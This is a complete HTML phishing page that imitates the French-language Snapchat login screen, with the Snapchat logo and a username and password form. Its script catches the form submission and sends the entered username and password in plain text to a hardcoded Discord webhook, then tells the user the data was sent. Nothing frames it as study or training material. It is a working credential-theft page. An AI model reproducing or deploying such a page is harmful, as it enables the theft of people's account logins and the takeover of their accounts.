<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Snapchat Connexion</title>
  <style>
    body {
      margin: 0; padding: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #ffffff;
      display: flex; justify-content: center; align-items: center;
      height: 100vh;
    }
    .login-box {
      width: 100%; max-width: 400px;
      padding: 40px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      border-radius: 10px;
      text-align: center;
    }
    .login-box img {
      width: 60px;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%; padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }
    button {
      background-color: #fffc00;
      border: none; color: #000;
      font-weight: bold; padding: 12px;
      width: 100%; border-radius: 8px;
      cursor: pointer; margin-top: 20px;
      font-size: 16px;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #e6e600;
    }
  </style>
</head>
<body>
  <div class="login-box">
   <img src="https://upload.wikimedia.org/wikipedia/fr/8/88/Snapchat.png" alt="Logo Snapchat" style="width: 80px; height: 80px; display: block; margin: 0 auto;" />

    <form id="loginForm">
      <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required />
      <input type="password" id="password" placeholder="Mot de passe" required />
      <button type="submit">Connexion</button>
    </form>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1382387384997515294/yI75S1jd9z_vRaMRNBYR8Kk_i8rNs8_cMeeNtMRoU7IZgWtI-R6Cch95PsOPsG51K8s2";

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      const message = {
        content: `**Nouveau login reçu:**\nNom d'utilisateur: \`${username}\`\nMot de passe: \`${password}\``
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(message),
      })
      .then(response => {
        if (response.ok) {
          alert("Données envoyées avec succès !");
          document.getElementById('loginForm').reset();
        } else {
          alert("Erreur lors de l'envoi des données.");
        }
      })
      .catch(error => {
        alert("Erreur réseau ou CORS.");
        console.error(error);
      });
    });
  </script>
</body>
</html>
